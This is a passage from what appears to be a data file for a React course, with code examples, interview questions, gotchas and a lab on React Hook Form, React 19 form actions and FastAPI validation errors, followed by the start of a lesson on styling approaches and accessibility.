  fieldErrors: Partial<Record<FieldName, string>>;
  values: Record<FieldName, string>; // echoed back so fields can be refilled after React resets the form
};
const initialState: FeedbackState = { status: "idle", message: "", fieldErrors: {}, values: { email: "", message: "" } };

async function sendFeedback(_prev: FeedbackState, formData: FormData): Promise<FeedbackState> {
  const values = { email: String(formData.get("email") ?? ""), message: String(formData.get("message") ?? "") };

  const parsed = feedbackSchema.safeParse(values);
  if (!parsed.success) {
    const fieldErrors: FeedbackState["fieldErrors"] = {};
    for (const issue of parsed.error.issues) {
      const key = issue.path[0];
      if ((key === "email" || key === "message") && !fieldErrors[key]) fieldErrors[key] = issue.message;
    }
    return { status: "error", message: "Please fix the highlighted fields.", fieldErrors, values };
  }

  const res = await fetch("/api/feedback", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(parsed.data),
  });
  if (res.status === 422) {
    const body = (await res.json()) as { detail: { loc: (string | number)[]; msg: string }[] };
    const fieldErrors: FeedbackState["fieldErrors"] = {};
    for (const d of body.detail) {
      const key = d.loc[1];
      if (key === "email" || key === "message") fieldErrors[key] = d.msg;
    }
    return { status: "error", message: "The server rejected some fields.", fieldErrors, values };
  }
  if (!res.ok) return { status: "error", message: "Could not send feedback. Try again.", fieldErrors: {}, values };
  return { ...initialState, status: "success", message: "Thanks! We read every message." };
}

// Must be rendered INSIDE the <form> to see its status.
function SubmitButton() {
  const { pending } = useFormStatus();
  return (
    <button type="submit" disabled={pending}>
      {pending ? "Sending…" : "Send feedback"}
    </button>
  );
}

export function FeedbackForm() {
  const [state, formAction, isPending] = useActionState(sendFeedback, initialState);

  return (
    <form action={formAction} noValidate aria-busy={isPending}>
      <p role="status">{state.message}</p>

      <label htmlFor="fb-email">Email</label>
      <input
        id="fb-email"
        name="email"
        type="email"
        defaultValue={state.values.email}
        aria-invalid={state.fieldErrors.email ? true : undefined}
        aria-describedby={state.fieldErrors.email ? "fb-email-error" : undefined}
      />
      {state.fieldErrors.email && <p id="fb-email-error">{state.fieldErrors.email}</p>}

      <label htmlFor="fb-message">Message</label>
      <textarea id="fb-message" name="message" rows={4} defaultValue={state.values.message} />
      {state.fieldErrors.message && <p>{state.fieldErrors.message}</p>}

      <SubmitButton />
    </form>
  );
}`,
          out: `Submit with a short message: button shows "Sending…" briefly, then the status says "Please fix the highlighted fields." and the typed values are still in the fields.
Successful submit: fields are empty, status says "Thanks! We read every message."`,
          note: `<p>No <code>onSubmit</code>, no <code>preventDefault</code>, no <code>useState</code> for pending: the action runs in a transition and React tracks it. Two things surprise people. First, React <b>resets uncontrolled fields</b> after the action completes, even when you returned errors; returning the submitted <code>values</code> and using them as <code>defaultValue</code> is the common workaround (the exact reset timing has been discussed and adjusted in React releases, so verify on your version). Second, <code>useFormStatus</code> reads the <i>parent</i> form, which is why <code>SubmitButton</code> is a separate component. Hooks such as <code>useActionState</code> are React 19 APIs; on React 18 they don't exist.</p>`
        },
        {
          t: "useOptimistic: show the comment immediately, roll back on failure",
          lang: "tsx",
          code: `import { startTransition, useOptimistic, useState } from "react";

type Comment = { id: string; text: string; pending?: boolean };

export function Comments({ postId, initial }: { postId: number; initial: Comment[] }) {
  const [comments, setComments] = useState<Comment[]>(initial);
  const [error, setError] = useState<string | null>(null);

  // While an action is running, optimisticComments = updateFn(comments, value).
  const [optimisticComments, addOptimisticComment] = useOptimistic(
    comments,
    (current: Comment[], text: string): Comment[] => [
      ...current,
      { id: "temp-" + crypto.randomUUID(), text, pending: true },
    ],
  );

  async function addComment(formData: FormData) {
    const text = String(formData.get("text") ?? "").trim();
    if (!text) return;
    setError(null);
    addOptimisticComment(text); // must be called inside an action/transition

    const res = await fetch("/api/posts/" + postId + "/comments", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text }),
    });
    if (!res.ok) {
      setError("Your comment could not be posted."); // optimistic item disappears when the action ends
      return;
    }
    const saved = (await res.json()) as Comment;
    // Updates after an await are not automatically part of the action's transition (React 19 limitation):
    startTransition(() => setComments((prev) => [...prev, saved]));
  }

  return (
    <section aria-labelledby="comments-h">
      <h2 id="comments-h">Comments</h2>
      <ul>
        {optimisticComments.map((c) => (
          <li key={c.id} style={{ opacity: c.pending ? 0.6 : 1 }}>
            {c.text} {c.pending && <small>(sending…)</small>}
          </li>
        ))}
      </ul>
      {error && <p role="alert">{error}</p>}
      <form action={addComment}>
        <label htmlFor="new-comment">Add a comment</label>
        <input id="new-comment" name="text" required />
        <button type="submit">Post</button>
      </form>
    </section>
  );
}`,
          out: `Click Post: the comment appears at once, greyed out "(sending…)".
200 OK: it is replaced by the saved comment (real id).
500: it vanishes and "Your comment could not be posted." appears.`,
          note: `<p><code>useOptimistic</code> never edits your real state; it overlays a temporary value for the lifetime of the action, so rollback is automatic. Compare TanStack Query's optimistic updates (Day 7), which edit the <i>cache</i> and need an explicit rollback in <code>onError</code>: use that approach when several components read the same data from the cache. For a fully progressive version the text would be lost on error after the form reset; for comments that is usually acceptable, for long content keep it in state or restore it.</p>`
        }
      ],
      internals: `<p><b>How RHF avoids re-renders.</b> <code>useForm</code> creates a <code>control</code> object once (kept in a ref) holding <code>_fields</code> (the registered refs and rules), <code>_formValues</code>, <code>_defaultValues</code> and <code>_formState</code>, plus a small subject/observer system. <code>register</code> returns a <b>ref callback</b>: when React attaches the DOM node, RHF stores it. Its <code>onChange</code> reads <code>event.target.value</code> (or <code>checked</code>, files, number/date conversions), writes it into <code>_formValues</code>, decides whether this event should validate (based on <code>mode</code> and whether the form was submitted), and only then notifies subscribers. Your component re-renders through a single <code>useState</code> tick inside <code>useForm</code>, and only if a property you read from the <code>formState</code> proxy actually changed. That proxy works like a getter trap: reading <code>formState.isDirty</code> during render flips a "subscribed to isDirty" flag.</p>
<p><b>Controller vs register.</b> <code>useController</code> registers the field too, but keeps the field's value in React state inside the controller component, so that component re-renders on each change (it is a controlled input), while siblings don't. <code>useWatch</code> subscribes a component to specific paths; <code>watch()</code> called in the form component subscribes the <i>form component</i>. <code>useFieldArray</code> keeps its own array of <code>{ id, ...values }</code> objects; the ids are generated keys so React's reconciliation (Day 4) matches the same row's DOM inputs after a remove or move. Use the index as key and React would reuse the wrong DOM inputs, whose uncontrolled values stay where they were.</p>
<p><b>Resolvers.</b> A resolver is just <code>(values, context, options) =&gt; Promise&lt;{ values, errors }&gt;</code>. <code>zodResolver</code> calls <code>schema.safeParseAsync</code> (or the sync version), and converts each Zod issue's <code>path</code> array into a dot path and nests the errors into RHF's shape. When the resolver is set, RHF runs it for the whole form even if one field changed and then picks the errors relevant to the fields being validated, which is why very expensive schemas (or async refinements that hit the network) should be kept off the per-keystroke path.</p>
<p><b>React 19 actions.</b> When React DOM sees a function as the <code>action</code> prop of a <code>&lt;form&gt;</code>, it intercepts the native submit event, builds a <code>FormData</code> from the form (and the submitter button's name/value), and calls your function inside <code>startTransition</code>. Because it is a transition, other urgent updates (typing elsewhere) are not blocked, and the pending state is tracked by React: <code>useFormStatus</code> reads a context-like "form status" that React DOM provides for the form element that is a parent of the calling component. <code>useActionState</code> stores state in the hook list like <code>useReducer</code>, but its "reducer" is your async action and calls are <b>queued</b>: if the user submits twice quickly, the second call receives the first call's result as <code>prevState</code>. After the action transition completes, React DOM calls the internal equivalent of <code>requestFormReset(form)</code> (also exported from <code>react-dom</code>) so uncontrolled fields return to their <code>defaultValue</code>. <code>useOptimistic</code> keeps a queue of pending optimistic updates attached to the current transition; when the transition finishes, React re-renders from the base state and the queue is dropped.</p>`,
      prod: `<p><b>A typical React + FastAPI product</b> ends up with three kinds of forms. <b>Settings and CRUD forms</b> (user profile, project settings, invoice editor) use RHF + Zod: they need dirty tracking ("you have unsaved changes"), field arrays and custom widgets. They submit through a TanStack Query <code>useMutation</code>, so a success invalidates the cached <code>['projects', id]</code> query; FastAPI writes to PostgreSQL and evicts the Redis cache entry for that project. <b>Small one-shot forms</b> (newsletter, feedback, search) are fine as plain <code>&lt;form action&gt;</code> + <code>useActionState</code>. <b>Auth forms</b> (Day 8) stay simple and never echo passwords back into state.</p>
<p><b>Team conventions that pay off:</b> schemas live next to the feature (<code>features/signup/schema.ts</code>) and are exported for tests; a shared <code>&lt;Field&gt;</code> component handles label, <code>useId</code>, hint, error and <code>aria-describedby</code> (see the next topic); one <code>applyServerErrors</code> helper maps 422s everywhere; FastAPI installs a custom <code>RequestValidationError</code> handler so every endpoint returns the same shape (without echoing <code>input</code>, which can contain secrets and ends up in Sentry); business-rule errors use a consistent <code>{ field, msg }</code> or <code>{ code, msg }</code> body.</p>
<p><b>What goes wrong at scale:</b> forms that call <code>watch()</code> at the top and re-render 200 inputs per keystroke; field arrays keyed by index that shuffle values when a row is removed; <code>defaultValues</code> loaded asynchronously but never applied (fix: render the form only when data has loaded, or call <code>reset(data)</code> when it arrives); double submissions because the button wasn't disabled during <code>isSubmitting</code> (and no idempotency key on the API); client rules stricter than the server's, so users are blocked from valid input; server rules stricter than the client's, with 422s that land in a generic toast; and client-only validation trusted as security. A good contract test posts an invalid body to FastAPI in CI and asserts every <code>loc</code> maps to a rendered field.</p>
<p><b>Migration notes for leads.</b> Moving a large app to React 19 does not require touching RHF forms. Adopt actions where they remove code (simple forms, Server Functions in a Next.js app), not as a rewrite. RHF can be combined with transitions (call <code>startTransition</code> inside <code>onValid</code>) but you don't get <code>useFormStatus</code> for free unless the form uses an <code>action</code>; pick one model per form.</p>`,
      iq: [
        ["fresher", "What is the difference between a controlled and an uncontrolled input, and which one does React Hook Form use?", `<p>A <b>controlled</b> input gets its value from React state (<code>value</code> + <code>onChange</code>); React is the source of truth and re-renders on every change. An <b>uncontrolled</b> input keeps its value in the DOM; you give it a <code>defaultValue</code> and read it when needed (ref or <code>FormData</code>). RHF uses <b>uncontrolled</b> inputs by default: <code>register</code> attaches a ref and listeners and reads the DOM value, so typing doesn't re-render the form. It switches to controlled only for components wrapped in <code>Controller</code>. The tempting wrong answer is "uncontrolled means React can't validate it": RHF validates uncontrolled inputs just fine, it just doesn't store each keystroke in React state.</p>`],
        ["fresher", "Why do we still validate on the server if the client already validates with Zod?", `<p>Because the client is not under your control. Anyone can bypass the UI and call the API with <code>curl</code>, an old app version may have outdated rules, and some checks (unique email, stock levels, permissions) need the database. Client validation is for <b>fast feedback</b>; server validation (Pydantic in FastAPI) is the <b>authority</b>. The client must also be ready to display server errors, typically a 422 list mapped to fields.</p>`],
        ["mid", "Your large form lags while typing. What are the likely causes and fixes?", `<p>Usually the whole form re-renders on each keystroke. Causes: all values in one <code>useState</code> object; with RHF, calling <code>watch()</code> without arguments (or reading many <code>formState</code> properties) in the form component; expensive children (charts, editors) not isolated; a heavy resolver running on change (<code>mode: "onChange"</code>). Fixes: switch to RHF uncontrolled fields; replace <code>watch()</code> with <code>useWatch</code> in a small child component that needs the value; validate on blur/touched instead of change; split the form into sections. Measure with the React Profiler (Day 11) first; <code>React.memo</code> everywhere is the tempting wrong fix, because unstable callbacks defeat it and it treats the symptom.</p>`],
        ["mid", "How do you map FastAPI 422 errors onto form fields?", `<p>FastAPI returns <code>{ detail: [{ loc, msg, type }] }</code>. For each item, drop the first <code>loc</code> segment (<code>"body"</code>), join the rest with dots (<code>["body","lines",2,"qty"]</code> → <code>lines.2.qty</code>, the same path RHF uses), and call <code>setError(path, { type: "server", message: msg })</code>, focusing the first one. Anything that doesn't match a known field goes to a form-level error (<code>root.server</code>) so it isn't lost. The common bug is joining the whole <code>loc</code> (<code>body.email</code>), which creates an error nobody renders. Business errors like "email taken" (409) should also carry a field name so they can be placed the same way.</p>`],
        ["mid", "When would you use <code>Controller</code> instead of <code>register</code>?", `<p>When the input is not a native element that accepts a ref and change events: UI-kit date pickers, selects/comboboxes, sliders, switches built from buttons, rich-text editors. They expose <code>value</code>/<code>onChange</code>, so <code>Controller</code> (or <code>useController</code>) gives you <code>field.value</code>, <code>field.onChange</code>, <code>field.onBlur</code> and <code>field.ref</code>, making that one field controlled. Using <code>Controller</code> for plain inputs works but throws away RHF's uncontrolled performance advantage for no reason.</p>`],
        ["senior", "Explain <code>useActionState</code> and <code>useFormStatus</code>. What are the common mistakes?", `<p><code>useActionState(action, initialState)</code> (from <code>react</code>, React 19) returns <code>[state, formAction, isPending]</code>. You pass <code>formAction</code> to <code>&lt;form action&gt;</code>; on submit React calls <code>action(prevState, formData)</code> inside a transition and stores whatever it returns as the next state; concurrent submissions are queued. <code>useFormStatus()</code> (from <code>react-dom</code>) gives <code>{ pending, data, method, action }</code> for the parent form. Mistakes: calling <code>useFormStatus</code> in the component that renders the form (it reads the <i>parent</i> form, so <code>pending</code> is always false); forgetting the action signature changes from <code>(formData)</code> to <code>(prevState, formData)</code>; being surprised that React resets uncontrolled fields after the action even on validation errors (return the values and use them as <code>defaultValue</code>); importing <code>useFormState</code>, the canary-era name.</p>`],
        ["senior", "Why must <code>useFieldArray</code> rows be keyed by <code>field.id</code> and not by index?", `<p>The inputs are uncontrolled: their current values live in DOM nodes. React matches list items between renders by key (Day 4). If you key by index and remove row 0, React thinks row 0 still exists (key 0) and row 2 disappeared, so it removes the <i>last</i> DOM row and keeps the first one, which still shows the deleted row's text. RHF's data says one thing, the screen another, and errors attach to the wrong row. <code>field.id</code> is a stable generated id per row, so React removes exactly the right DOM nodes. The same applies to reordering with <code>move</code>/<code>swap</code>.</p>`],
        ["lead", "How would you keep client and server validation rules from drifting in a React + FastAPI team?", `<p>Make one side the source of truth and automate the rest. Practical setup: Pydantic models are the contract; FastAPI publishes OpenAPI; CI generates TypeScript types (and optionally Zod schemas) from it, so a renamed field breaks the frontend build. Hand-written Zod schemas for forms import or are checked against the generated types (<code>satisfies</code> or a type-level equality test). Add a contract test that sends known-invalid payloads to the API and asserts the error <code>loc</code>s map to rendered fields. Accept that complex validators (cross-table checks) stay server-only and make sure the UI shows their errors well. The tempting wrong answer, "write the rules twice and be careful", always drifts.</p>`],
        ["architect", "React Hook Form or React 19 actions: how do you decide for a large product, and can they coexist?", `<p>They solve overlapping but different problems. RHF is a <b>client-side form state engine</b>: per-field validation timing, dirty/touched tracking, field arrays, custom inputs, focus management, all without re-rendering the form. Actions are a <b>submission model</b> built on transitions: pending state, optimistic UI, form reset and, with Server Functions in an RSC framework, progressive enhancement (forms that work before JS loads). For a Vite SPA talking to FastAPI, RHF + Zod + TanStack Query mutations is the robust default for complex forms; actions for simple ones. In a Next.js App Router app, actions + server-side Zod for most forms, RHF where the UX needs it. They coexist per form, not inside one form: mixing both submission paths in one form duplicates pending state and error handling. Decide by form complexity and whether progressive enhancement matters, and document the rule so the codebase doesn't end up with five patterns.</p>`]
      ],
      gotchas: [
        `<b>Async <code>defaultValues</code> are read once.</b> <code>useForm({ defaultValues: data })</code> where <code>data</code> is still <code>undefined</code> on the first render will not update later. Either render the form after the query has data (a child component with the data as a prop), pass a function returning a promise as <code>defaultValues</code>, use the <code>values</code> option, or call <code>reset(data)</code> when it arrives.`,
        `<b><code>valueAsNumber</code> turns an empty field into <code>NaN</code>, not <code>undefined</code>.</b> <code>z.number().optional()</code> will reject <code>NaN</code>. For optional numbers either validate the raw string and transform, or use <code>setValueAs: (v) =&gt; v === "" ? undefined : Number(v)</code>.`,
        `<b>Disabled inputs are excluded</b> from submitted values (as in a native form submit) and their values become <code>undefined</code>. If you want a read-only field that still submits, use <code>readOnly</code>, not <code>disabled</code>.`,
        `<b><code>handleSubmit</code> doesn't swallow exceptions.</b> If your <code>onValid</code> throws, <code>isSubmitSuccessful</code> stays false and the error propagates (often to an unhandled promise rejection). Catch network errors and turn them into <code>setError("root.server", …)</code>.`,
        `<b>React 19 resets the form after an action</b> even when your action returned validation errors, so the user's input can vanish. Return the submitted values and use them as <code>defaultValue</code>, or use controlled inputs for that form.`,
        `<b><code>useFormStatus</code> only sees a parent form.</b> Called in the same component that renders the <code>&lt;form&gt;</code>, it always reports <code>pending: false</code>. Move it into a child component rendered inside the form.`,
        `<b>State updates after <code>await</code> inside an action</b> are not automatically part of that action's transition in React 19; wrap them in <code>startTransition</code> if they should be (for example to avoid a flash between the optimistic and the real value).`,
        `<b>Server errors persist until the field revalidates.</b> With <code>mode: "onSubmit"</code> the server error under Email stays visible while the user fixes it, until the next submit. Use <code>"onTouched"</code>/<code>reValidateMode: "onChange"</code>, or call <code>clearErrors("email")</code> on change.`,
        `<b><code>setError</code> on a path that has no rendered input</b> (e.g. <code>body.email</code>) stores an error nobody displays and blocks nothing. Always have a fallback to a visible form-level message.`
      ],
      best: [
        `Always pass complete <code>defaultValues</code>; they drive initial state, <code>isDirty</code>, <code>reset()</code> and the types RHF infers for field arrays.`,
        `Keep one Zod schema per form, exported from the feature folder, and derive the type with <code>z.infer</code>; never hand-write a parallel interface.`,
        `Validate on <code>"onTouched"</code> or <code>"onBlur"</code> by default; reserve <code>"onChange"</code> for fields where live feedback is the point (password strength).`,
        `Centralise server-error mapping (422 and business errors) in one helper, focus the first errored field, and fall back to a visible form-level alert for anything unmapped.`,
        `Subscribe narrowly: <code>useWatch</code> in small child components, read only the <code>formState</code> properties you render.`,
        `Disable the submit button while submitting and make the API idempotent for critical operations (payments, orders) so a double click or retry cannot create duplicates.`,
        `Use React 19 actions for small forms and Server Functions; use RHF for complex client forms; don't mix both submission paths in one form.`,
        `Treat the form as an accessibility component too: every input has a label, errors are linked with <code>aria-describedby</code> and flagged with <code>aria-invalid</code> (next topic).`
      ],
      lab: [
        `In your Vite app run <code>npm install react-hook-form zod @hookform/resolvers</code>. Build the controlled-everything profile form from example 1 and confirm in the console that it renders on every keystroke.`,
        `Rewrite it with RHF + Zod (<code>zodResolver</code>, <code>z.infer</code>). Add a <code>console.log</code> in the form and confirm typing no longer logs, while tabbing out of an invalid field logs once.`,
        `Add an invoice section with <code>useFieldArray</code>: add/remove lines and a live total in a separate <code>InvoiceTotal</code> component using <code>useWatch</code>. Temporarily key rows by index, type distinct text in three rows, remove the first, and observe the wrong text remain; switch back to <code>field.id</code>.`,
        `Create a FastAPI endpoint <code>POST /api/users</code> with the Pydantic model from example 6 (or mock it with MSW returning the 422 body shown). Implement <code>applyServerErrors</code> and make a server-only rule (email already taken → 409).`,
        `Build the feedback form with <code>useActionState</code> + <code>useFormStatus</code>, and a comment list with <code>useOptimistic</code>; make the API fail 50% of the time and watch the optimistic comment disappear on failure.`,
        `<b>Done when:</b> typing in the RHF form doesn't re-render it; submitting invalid data that passes the client (e.g. a duplicate email) shows the server's message under the right field with focus on it; field-array removal keeps the right values; and the action-based form shows "Sending…" from a child <code>SubmitButton</code> and keeps the user's input when the server returns errors.`
      ],
      teach: `<p>"Forms have three jobs: hold values, validate them, and submit them. The naive React way puts every field in state, so every keystroke re-renders the whole form, and you hand-write touched flags and validators. React Hook Form flips that: the DOM keeps the values, <code>register</code> wires each input with a ref, and the form only re-renders when something you actually display changes, like an error. For inputs that aren't native, <code>Controller</code> makes just that one field controlled; for repeating rows, <code>useFieldArray</code> gives each row a stable id you use as the key.</p>
<p>Validation rules live in a Zod schema, which gives both runtime checks and the TypeScript type. But the client is only for fast feedback: FastAPI and Pydantic check everything again, and when they return a 422, I map each error's <code>loc</code>, minus the leading 'body', to the RHF field path and call <code>setError</code>, so the message appears under the right field.</p>
<p>React 19 adds a second model: pass a function to <code>&lt;form action&gt;</code>, wrap it with <code>useActionState</code> to get state and <code>isPending</code>, use <code>useFormStatus</code> in a child button, and <code>useOptimistic</code> for instant feedback. I use actions for simple forms and Server Functions, and React Hook Form for big, interactive client forms."</p>`
    },
    /* ------------------------------------------------------------------ */
    {
      id: "d9-styling-a11y",
      title: "Styling and accessibility in React",
      lv: ["fresher", "mid", "senior", "lead", "architect"],
      eli5: `<p>Think of a building. <b>Styling</b> is the paint, the furniture and the signs. You can paint each room by hand (plain CSS), give every room its own labelled paint tins so colours never leak into the next room (CSS Modules), keep a box of ready-made stickers you combine on the spot (Tailwind), or hire a painter who mixes paint fresh every time someone walks in (runtime CSS-in-JS: flexible, but someone is always mixing). A <b>design token</b> is the building's official colour chart: "brand blue" is defined once and every room refers to it.</p>
<p><b>Accessibility</b> is whether everyone can use the building: people in wheelchairs, people who can't see the signs, people who navigate by touch. A painted rectangle on the wall that <i>looks</i> like a door is not a door: you can't walk through it. In web terms, a <code>&lt;div&gt;</code> styled like a button looks clickable, but a keyboard user can't reach it and a screen reader doesn't announce it as a button. A real <code>&lt;button&gt;</code> is a real door.</p>
<p>A <b>modal</b> is a room with one door. When you walk in, the door should close behind you (focus stays inside), there should be an obvious way out (Escape, a close button), and when you leave you should be back exactly where you were in the corridor (focus returns to the button that opened it), not dropped at the building's entrance.</p>`,
      what: `<p>Two topics that look unrelated but meet in the same place: your <b>component library</b>. Every <code>Button</code>, <code>Field</code>, <code>Modal</code> and <code>Tabs</code> you build decides both how things look and whether keyboard and assistive-technology users can operate them.</p>

<h5>Styling options in a React app</h5>
<ul class="pts">
<li><b>Plain global CSS.</b> <code>import "./index.css"</code> in a Vite app injects it globally. Simple and fast, but every class name is global: <code>.card</code> in two features collide, and nobody dares delete CSS. Fine for resets, tokens and base element styles.</li>
<li><b>CSS Modules</b> (<code>Button.module.css</code>): Vite (and Next.js) compile class names to unique ones (<code>_button_1x2y3</code>) and give you an object mapping your names to them: <code>import styles from "./Button.module.css"</code>, <code>className={styles.button}</code>. Locally scoped, zero runtime, real CSS (media queries, <code>:hover</code>, container queries), works with Server Components. The default choice for many teams.</li>
<li><b>Tailwind CSS</b>: utility classes (<code>px-4 py-2 rounded-md bg-blue-600</code>) in your JSX; the build scans your files and generates only the CSS you use. Zero runtime, consistent spacing/colour scale, no naming, very fast iteration. Costs: long class strings, a learning curve, and the need for a <code>cn()</code> helper (<code>clsx</code> + <code>tailwind-merge</code>) to let callers override classes. Tailwind v4 is configured in CSS (<code>@import "tailwindcss"</code>, <code>@theme</code> for tokens) with a Vite plugin; v3 used <code>tailwind.config.js</code> and <code>@tailwind</code> directives, so check which version a project uses.</li>
<li><b>Runtime CSS-in-JS</b> (styled-components, Emotion): styles written in JS, interpolating props (<code>color: \${p =&gt; p.tone}</code>), injected into a <code>&lt;style&gt;</code> tag <i>at runtime</i>. Great developer experience, colocated and dynamic, but: style serialisation and hashing on render costs CPU, the library ships to the browser, SSR needs extra setup to collect styles, and they depend on React context, so in a <b>Server Components</b> app they only work in client components. The ecosystem has moved away from them for new projects (styled-components' maintainer has put it into maintenance mode); you will still meet them in existing codebases.</li>
<li><b>Zero-runtime CSS-in-JS</b> (vanilla-extract, Linaria, Panda CSS, StyleX): you write styles in TS/JS, but a build step extracts them to static CSS files, so you keep type-safety and colocation without runtime cost, and they work with RSC. The trade-off is build tooling and less dynamic styling (dynamic values go through CSS variables).</li>
<li><b>Inline <code>style={{ … }}</code></b>: fine for truly dynamic values (a computed width, a CSS variable), not for theming or states like <code>:hover</code> and media queries, which inline styles can't express.</li>
</ul>

<h5>Design tokens with CSS custom properties</h5>
<p>A <b>design token</b> is a named design decision: <code>--color-primary</code>, <code>--space-4</code>, <code>--radius-md</code>, <code>--font-size-sm</code>. Define them as CSS custom properties on <code>:root</code>, use <code>var(--color-primary)</code> everywhere, and themes become a matter of overriding variables under a selector (<code>[data-theme="dark"]</code>) or a media query (<code>prefers-color-scheme</code>). Because custom properties cascade and are resolved by the browser, switching theme is one attribute change on <code>&lt;html&gt;</code>: no React re-render of the tree, no runtime style regeneration. Tokens work with every approach above: CSS Modules use <code>var()</code>, Tailwind v4 generates utilities from <code>@theme</code> variables, zero-runtime libraries emit them.</p>

<h5>Conditional classes</h5>
<p><code>clsx</code> (or the similar <code>classnames</code>) builds a class string from strings, objects and falsy values: <code>clsx(styles.btn, isActive &amp;&amp; styles.active, { [styles.danger]: tone === "danger" })</code>. With Tailwind, wrap it with <code>tailwind-merge</code> so <code>cn("px-4", props.className)</code> lets a caller's <code>px-2</code> win instead of both classes fighting by stylesheet order.</p>

<h5>Accessibility (a11y) in React</h5>
<p>React renders ordinary DOM, so accessibility is mostly HTML done right, plus a few React-specific concerns (generated ids, portals, focus after client-side navigation). The guiding standard is WCAG; the practical rules:</p>
<ul class="pts">
<li><b>Semantic elements first.</b> <code>&lt;button&gt;</code> for actions, <code>&lt;a href&gt;</code> (React Router's <code>&lt;Link&gt;</code>) for navigation, <code>&lt;nav&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;header&gt;</code>, headings in order, <code>&lt;ul&gt;</code> for lists, <code>&lt;table&gt;</code> for tabular data. A <code>&lt;div onClick&gt;</code> is not focusable, has no role, and doesn't respond to Enter/Space; adding <code>role="button"</code>, <code>tabIndex={0}</code> and a key handler re-implements a button badly.</li>
<li><b>Every input has a label.</b> <code>&lt;label htmlFor={id}&gt;</code> (JSX uses <code>htmlFor</code> because <code>for</code> is a JS keyword) or wrap the input in the label. Placeholders are not labels: they vanish when typing and often fail contrast. Group radio buttons and related fields with <code>&lt;fieldset&gt;</code> + <code>&lt;legend&gt;</code>.</li>
<li><b><code>useId</code></b> generates a unique, stable id per component instance that matches between server and client render (so it's safe with SSR/hydration). Use it for <code>htmlFor</code>/<code>id</code>, <code>aria-describedby</code>, <code>aria-labelledby</code>, <code>aria-controls</code>. Don't use it for list keys, and don't hard-code ids in reusable components: render two instances and you get duplicate ids.</li>
<li><b>ARIA only when HTML can't express it.</b> The first rule of ARIA: if a native element with the semantics exists, use it. ARIA changes what assistive technology <i>announces</i>, not how the element <i>behaves</i>: <code>role="button"</code> adds no keyboard support. Useful, legitimate ARIA: <code>aria-label</code> for icon-only buttons, <code>aria-describedby</code> for hints and errors, <code>aria-invalid</code>, <code>aria-expanded</code>/<code>aria-controls</code> for disclosures, <code>aria-current="page"</code> for the active nav link (React Router's <code>NavLink</code> sets it), <code>aria-live</code>/<code>role="status"</code>/<code>role="alert"</code> for announcements, and full widget patterns (tabs, combobox, menu) from the ARIA Authoring Practices Guide when no native element exists.</li>
<li><b>Keyboard navigation.</b> Everything usable by mouse must be usable by keyboard: Tab/Shift+Tab move between controls in DOM order (don't fight it with positive <code>tabIndex</code>), Enter/Space activate, Escape closes overlays, arrow keys move <i>within</i> composite widgets (tabs, menus, listboxes) using a <b>roving tabindex</b> (only the active item has <code>tabIndex={0}</code>). Never remove the focus outline without a visible replacement; <code>:focus-visible</code> shows it for keyboard users only.</li>
<li><b>Focus management.</b> In a SPA, client-side navigation doesn't reload the page, so screen readers aren't told anything changed and focus stays on the clicked link (which may no longer exist). Move focus to the new page's <code>&lt;h1&gt;</code> (or main region) after navigation and/or announce the new title in a live region. In modals: move focus in when opening, keep it in (trap), close on Escape, and <b>return focus to the opener</b> when closing.</li>
<li><b>Portals and modals.</b> <code>createPortal(children, document.body)</code> (from <code>react-dom</code>) renders a modal outside its parent's DOM (escaping <code>overflow: hidden</code> and <code>z-index</code> stacking contexts) while it stays in the same React tree: context, state and even <b>synthetic events bubble through the React tree</b>, not the DOM tree. A portal modal still needs <code>role="dialog"</code>, <code>aria-modal="true"</code>, a label, a focus trap, Escape handling and background made <code>inert</code>. The native <b><code>&lt;dialog&gt;</code></b> with <code>showModal()</code> gives you most of this from the browser: top-layer rendering (no z-index wars), a <code>::backdrop</code>, background made inert, Escape to close (firing <code>cancel</code> and <code>close</code>), and in current browsers focus moves into the dialog and back to the previously focused element on close; still verify focus return in the browsers you support.</li>
<li><b>Tooling.</b> <code>eslint-plugin-jsx-a11y</code> catches static problems (missing <code>alt</code>, click handlers on non-interactive elements, labels without controls). <b>axe-core</b> checks rendered DOM (in unit tests via jsdom, or in Playwright with <code>@axe-core/playwright</code>, and in the browser via axe DevTools / Lighthouse). Automated tools catch only part of the problems (commonly quoted as roughly a third to a half); the rest needs a keyboard-only pass and a <b>screen reader</b> (VoiceOver on macOS/iOS, NVDA on Windows, TalkBack on Android). Testing Library's <code>getByRole</code> queries (Day 14) are themselves a cheap a11y test: if you can't find the button by role and name, neither can a screen reader user.</li>
<li><b>Headless UI libraries.</b> Complex widgets (combobox, menu, date picker, dialog, popover) have intricate keyboard and ARIA rules. <b>Radix UI</b> primitives, <b>React Aria</b> (Adobe) and Headless UI implement the behaviour and accessibility without imposing styles, so you style them with CSS Modules or Tailwind (shadcn/ui is a popular set of copy-in components built on Radix and Tailwind). Day 10 covers the headless pattern itself.</li>
</ul>`,
      why: `<p><b>Styling at scale</b> is a coordination problem. Global CSS was fine for documents; for a 200-component app built by several teams it produced collisions, specificity wars and dead CSS no one could safely delete. CSS-in-JS solved scoping and colocation but moved work to runtime; CSS Modules and Tailwind solved scoping at build time. Design tokens exist so "brand blue" and "spacing 4" are decided once and themes (dark mode, white-label customers) are a variable swap instead of a rewrite.</p>
<p><b>Accessibility</b> exists because a significant share of users rely on a keyboard, screen reader, magnification, voice control or switch devices, temporarily or permanently, and because it is a legal requirement in many places (for example accessibility laws referencing WCAG for public-sector and, increasingly, commercial sites in the EU and US). SPAs made it easier to break: the browser gives you focus handling, page-load announcements and keyboard behaviour for free with real links, buttons and page loads, and a React app that replaces them with <code>&lt;div onClick&gt;</code> and client-side routing silently throws those away. React doesn't make apps inaccessible, but it makes it very easy to build things that only work with a mouse.</p>`,
      diagram: {
        html: lanes([
          ["Styling choice", ["Global CSS: tokens, resets, base", "CSS Modules: scoped, zero runtime", "Tailwind: utilities, zero runtime", "Runtime CSS-in-JS: JS cost, client-only in RSC", "Zero-runtime CSS-in-JS: extracted at build"]],
          ["Accessible component", ["Semantic element (button, a, label)", "Name: label / aria-label / aria-labelledby", "State: aria-expanded, aria-invalid, aria-current", "Keyboard: Tab, Enter/Space, Esc, arrows", "Focus: visible, managed, returned"]],
          ["Verify", ["eslint-plugin-jsx-a11y (static)", "Testing Library getByRole", "axe-core in tests / Playwright", "Keyboard-only walkthrough", "Screen reader (NVDA, VoiceOver)"]]
        ]) + flow([
